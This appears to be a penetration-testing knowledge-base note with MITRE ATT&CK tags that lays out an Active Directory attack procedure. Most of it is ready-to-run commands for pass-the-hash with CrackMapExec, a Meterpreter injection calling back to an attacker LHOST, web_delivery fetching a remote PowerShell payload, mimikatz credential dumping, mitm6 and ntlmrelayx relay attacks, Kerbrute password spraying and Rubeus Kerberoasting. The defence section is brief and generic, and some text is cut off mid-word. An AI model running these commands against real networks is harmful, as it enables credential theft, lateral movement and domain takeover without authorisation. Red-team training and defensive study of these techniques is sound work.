---
id: 3e7554a6-e348-42ff-b4db-141424f3c9a6
name: Active Directory Assessment and Privilege Escalation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:01.897836+00:00'
updated_at: '2023-05-25T20:03:16.795391+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Discovery|TA0007 - Discovery]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Domain Trust Discovery|T1482 - Domain Trust Discovery]]'
- '[[Kerberoasting|T1208 - Kerberoasting]]'
- '[[Pass the Ticket|T1097 - Pass the Ticket]]'
- '[[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]'
sub_techniques:
- '[[AS-REP Roasting|T1558.004 - AS-REP Roasting]]'
- '[[Kerberoasting|T1558.003 - Kerberoasting]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Tools]]'
commands:
- '[[ADRecon.ps1]]'
- '[[Ask TGT Ticket]]'
- '[[Clone mitm6 repository]]'
- '[[Download CME and execute smb module]]'
- '[[Dump Ticket]]'
- '[[Execute mimikatz server with http and port 80]]'
- '[[Execute smb module to list shares]]'
- '[[Execute smb module with authentication]]'
- '[[Execute smb module with domain and module name]]'
- '[[Execute smb module with metinject module and LHOST/LPORT options]]'
- '[[Execute smb module with mimikatz module and local authentication]]'
- '[[Execute smb module with module name and variable data]]'
- '[[Execute smb module with RDP module and enable action]]'
- '[[Execute smb module with smbexec method and command]]'
- '[[Execute smb module with web_delivery module and URL option]]'
- '[[Install mitm6]]'
- '[[Kerberoasting]]'
- '[[Kerberos List]]'
- '[[Kerbrute Password Spray]]'
- '[[PingCastle Graph]]'
- '[[PingCastle Health Check]]'
- '[[PingCastle Health Check with Advanced Options]]'
- '[[PingCastle Scanner]]'
- '[[Run mitm6]]'
- '[[Run ntlmrelayx.py for LDAP relay]]'
- '[[Run ntlmrelayx.py for SMB relay]]'
---

# Active Directory Assessment and Privilege Escalation

## Summary

Active Directory Assessment and Privilege Escalation is a procedure that enables a user to assess an Active Directory environment for vulnerabilities and escalate privileges to gain unauthorized access. This procedure involves using various tools and techniques to enumerate domain information, iden

## Description

# Description

Active Directory Assessment and Privilege Escalation is a procedure that enables a user to assess an Active Directory environment for vulnerabilities and escalate privileges to gain unauthorized access. This procedure involves using various tools and techniques to enumerate domain information, identify vulnerable systems, and exploit them to escalate privileges. The technical explanation involves using tools like CrackMapExec, Rubeus, and Kerbrute to identify vulnerabilities and exploit them. The business value of this procedure is to identify and remediate vulnerabilities in the Active Directory environment, which can lead to improved security posture and reduced risk of a security breach.

## Requirements

1. Access to the Active Directory environment

1. Credentials with appropriate permissions

1. Tools like CrackMapExec, Rubeus, and Kerbrute

## Defense

1. Implement least privilege access controls to limit the impact of privilege escalation attacks

1. Enable multi-factor authentication to prevent unauthorized access to the Active Directory environment

1. Regularly review and update security policies and procedures to ensure they are up-to-date and effective

## Objectives

1. Assess the security posture of the Active Directory environment

1. Identify vulnerabilities and exploit them to escalate privileges

1. Remediate vulnerabilities and improve the overall security posture

# Instructions

1. To use CrackMapExec for SMB enumeration and exploitation, follow these steps:
1. Download the latest release of CME using the provided link.
2. Execute CME with the desired module and arguments. For example, `cme smb -L` will list all available SMB modules, `cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth` will authenticate with the provided credentials, and `cme smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher` will use the 'invoke_sessiongopher' module with the provided arguments.

**Code**: [[# use the latest release, CME is now a binary pack]]

> CrackMapExec is a powerful tool for enumerating and exploiting vulnerabilities in SMB, WinRM, MSSQL, and other protocols. This JSON object provides an overview of how to use CME for SMB enumeration and exploitation. The `name` field provides a descriptive name for this command, while the `data` field provides the actual commands to be executed. The `lang` field specifies the language of the commands, and the `text` field provides a link to the CME GitHub repository. The `instruction` field provides step-by-step instructions on how to use CME for SMB enumeration and exploitation, while the `explain` field provides additional information on what CME is and what it does.

**Command** ([[Download CME and execute smb module]]):

```bash
root@payload$ wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip
root@payload$ cme smb -L
```

**Command** ([[Execute smb module with module name and variable data]]):

```bash
root@payload$ cme smb -M name_module -o VAR=DATA
```

**Command** ([[Execute smb module with authentication]]):

```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
```

**Command** ([[Execute smb module to list shares]]):

```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
```

**Command** ([[Execute smb module with domain and module name]]):

```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
```

**Command** ([[Execute smb module with RDP module and enable action]]):

```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
```

**Command** ([[Execute smb module with metinject module and LHOST/LPORT options]]):

```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
```

**Command** ([[Execute smb module with web_delivery module and URL option]]):

```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
```

**Command** ([[Execute smb module with smbexec method and command]]):

```bash
root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
```

**Command** ([[Execute smb module with mimikatz module and local authentication]]):

```bash
root@payload$ cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
```

**Command** ([[Execute mimikatz server with http and port 80]]):

```bash
root@payload$ cme mimikatz --server http --server-port 80
```

2. The above command is used to perform a Man-in-the-Middle (MITM) attack using Mitm6 tool. The attack is performed by cloning the Mitm6 repository, installing it, and running the Mitm6 tool with the specified domain name. This command also uses ntlmrelayx.py tool to relay NTLM authentication requests to the attacker's machine. The -wh option specifies the IP address of the attacker's machine hosting the WPAD file. The -t option specifies the target machine to which the credentials are to be relayed. The --delegate-access option is used to delegate access to the target machine.

**Code**: [[git clone https://github.com/fox-it/mitm6.git && c]]

> The Mitm6 tool is used to perform a MITM attack by spoofing the network traffic and intercepting the communication between the client and server. The ntlmrelayx.py tool is used to relay NTLM authentication requests to the attacker's machine, allowing the attacker to obtain the credentials of the target user. The -wh option specifies the IP address of the attacker's machine hosting the WPAD file. The -t option specifies the target machine to which the credentials are to be relayed. The --delegate-access option is used to delegate access to the target machine, allowing the attacker to perform actions on behalf of the target user.

**Command** ([[Clone mitm6 repository]]):

```bash
git clone https://github.com/fox-it/mitm6.git && cd mitm6
```

**Command** ([[Install mitm6]]):

```bash
pip install .
```

**Command** ([[Run mitm6]]):

```bash
mitm6 -d lab.local
```

**Command** ([[Run ntlmrelayx.py for SMB relay]]):

```bash
ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i
```

**Command** ([[Run ntlmrelayx.py for LDAP relay]]):

```bash
ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access
```

3. This command is used for performing reconnaissance on an Active Directory environment. The '-DomainController' argument specifies the domain controller to target and the '-Credential' argument specifies the credentials to use for the authentication.

**Code**: [[.\ADRecon.ps1 -DomainController MYAD.net -Credenti]]

> ADRecon is a PowerShell script that can be used for Active Directory reconnaissance. It can identify users, groups, computers, and other objects in an AD environment. It can also identify vulnerabilities and misconfigurations in the AD environment. The '-DomainController' argument specifies the domain controller to target and the '-Credential' argument specifies the credentials to use for the authentication. This command can be useful for penetration testing and red teaming activities to gather information about an AD environment.

**Command** ([[ADRecon.ps1]]):

```bash
.\ADRecon.ps1 -DomainController MYAD.net -Credential MYAD\myuser
```

4. This command executes the ADAPE script which is designed to assess the security posture of an Active Directory environment and identify potential privilege escalation paths. It is recommended to review the script and its output carefully before taking any actions.

**Code**: [[powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1]]

> The `-ExecutionPolicy Bypass` argument is used to bypass the PowerShell script execution policy. The `./ADAPE.ps1` argument specifies the path to the ADAPE script. The script will then run and output its findings to the console.

5. The Ping Castle tool provides various commands for analyzing Active Directory security. The available commands are:
1. `--healthcheck`: Performs a health check on the Active Directory environment. Use the `--server` flag to specify the domain controller IP or domain name. You can also use the `--user` and `--password` flags to provide credentials for the domain controller. The `--advanced-live` flag enables live mode and the `--nullsession` flag enables null session mode.
2. `--graph`: Generates a graph of the Active Directory environment. Use the `--server` flag to specify the domain controller IP or domain name.
3. `--scanner`: Runs a specific scanner against the Active Directory environment. Use the `--server` flag to specify the domain controller IP or domain name and the `--scanner` flag to specify the name of the scanner. Available scanners are: aclcheck, antivirus, computerversion, foreignusers, laps_bitlocker, localadmin, nullsession, nullsession-trust, oxidbindings, remote, share, smb, smb3querynetwork, spooler, startup, zerologon, computers, users.

**Code**: [[pingcastle.exe --healthcheck --server <DOMAIN_CONT]]

> The `--healthcheck` command performs a comprehensive security analysis of the Active Directory environment, including checking for misconfigurations, vulnerabilities, and potential security risks. The `--graph` command generates a visual representation of the Active Directory environment, showing the relationships between different objects and their permissions. The `--scanner` command runs a specific scanner against the Active Directory environment, checking for specific vulnerabilities or security issues. The available scanners cover a wide range of potential security risks, including ACL misconfigurations, antivirus configurations, local administrator accounts, and more.

**Command** ([[PingCastle Health Check with Advanced Options]]):

```bash
pingcastle.exe --healthcheck --server <DOMAIN_CONTROLLER_IP> --user <USERNAME> --password <PASSWORD> --advanced-live --nullsession
```

**Command** ([[PingCastle Health Check]]):

```bash
pingcastle.exe --healthcheck --server domain.local
```

**Command** ([[PingCastle Graph]]):

```bash
pingcastle.exe --graph --server domain.local
```

**Command** ([[PingCastle Scanner]]):

```bash
pingcastle.exe --scanner scanner_name --server domain.local
```

6. This command is used to perform a password spray attack using Kerbrute. The attack is performed against a specified domain with a list of usernames and a single password.

**Code**: [[./kerbrute passwordspray -d <DOMAIN> <USERS.TXT> <]]

> The <DOMAIN> argument should be replaced with the name of the target domain. The <USERS.TXT> argument should be replaced with the path to a file containing a list of usernames to target. The <PASSWORD> argument should be replaced with the password to be used in the attack. This command is useful for testing the strength of user passwords within a domain.

**Command** ([[Kerbrute Password Spray]]):

```bash
./kerbrute passwordspray -d <DOMAIN> <USERS.TXT> <PASSWORD>
```

7. Rubeus is a tool for attacking Kerberos. It can request TGTs, dump tickets, list tickets, and perform Kerberoasting.

**Code**: [[Rubeus.exe asktgt /user:USER </password:PASSWORD []]

> The Rubeus tool has several commands that can be used to attack Kerberos. The `asktgt` command is used to request TGTs. The `/user` flag is used to specify the user account for which the TGT is being requested. The `/password` flag is used to specify the password for the user account. The `/enctype` flag is used to specify the encryption type for the TGT. The `dump` command is used to dump tickets. The `/service` flag is used to specify the service name for which tickets are being dumped. The `klist` command is used to list tickets. The `kerberoast` command is used to perform Kerberoasting. The `/spn` flag is used to specify the SPN for which Kerberoasting is being performed. The `/user` flag is used to specify the user account for which Kerberoasting is being performed. The `/domain` flag is used to specify the domain for which Kerberoasting is being performed. The `/ou` flag is used to specify the OU for which Kerberoasting is being performed.

**Command** ([[Ask TGT Ticket]]):

```bash
Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]
```

**Command** ([[Dump Ticket]]):

```bash
Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]
```

**Command** ([[Kerberos List]]):

```bash
Rubeus.exe klist [/luid:LOGINID]
```

**Command** ([[Kerberoasting]]):

```bash
Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
```

8. To create a new lab environment with a Windows Server 2016 machine, run the following commands:

**Code**: [[New-LabDefinition -Name GettingStarted -DefaultVir]]

> This command creates a new lab environment with the name 'GettingStarted' and sets the default virtualization engine to HyperV. The second command adds a new machine definition with the name 'FirstServer' and the operating system 'Windows Server 2016 SERVERSTANDARD'. The third command installs the lab and the fourth command shows a summary of the lab deployment.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Discovery|TA0007 - Discovery]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Domain Trust Discovery|T1482 - Domain Trust Discovery]]
- [[Kerberoasting|T1208 - Kerberoasting]]
- [[Pass the Ticket|T1097 - Pass the Ticket]]
- [[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]

### Sub-Techniques

- [[AS-REP Roasting|T1558.004 - AS-REP Roasting]]
- [[Kerberoasting|T1558.003 - Kerberoasting]]

## Commands Used

- [[ADRecon.ps1]]
- [[Ask TGT Ticket]]
- [[Clone mitm6 repository]]
- [[Download CME and execute smb module]]
- [[Dump Ticket]]
- [[Execute mimikatz server with http and port 80]]
- [[Execute smb module to list shares]]
- [[Execute smb module with authentication]]
- [[Execute smb module with domain and module name]]
- [[Execute smb module with metinject module and LHOST/LPORT options]]
- [[Execute smb module with mimikatz module and local authentication]]
- [[Execute smb module with module name and variable data]]
- [[Execute smb module with RDP module and enable action]]
- [[Execute smb module with smbexec method and command]]
- [[Execute smb module with web_delivery module and URL option]]
- [[Install mitm6]]
- [[Kerberoasting]]
- [[Kerberos List]]
- [[Kerbrute Password Spray]]
- [[PingCastle Graph]]
- *...and 6 more*

## Tags

- [[Active Directory Attacks]]
- [[Tools]]
